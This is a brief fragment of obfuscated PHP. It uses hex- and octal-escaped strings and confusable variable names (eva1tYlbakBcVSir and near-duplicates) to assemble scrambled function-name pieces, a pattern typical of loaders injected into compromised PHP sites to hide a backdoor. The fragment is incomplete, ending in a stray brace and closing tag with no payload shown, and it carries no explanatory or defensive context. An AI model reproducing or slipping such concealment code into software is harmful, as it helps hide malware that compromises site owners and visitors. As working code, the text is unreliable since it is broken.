$eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?>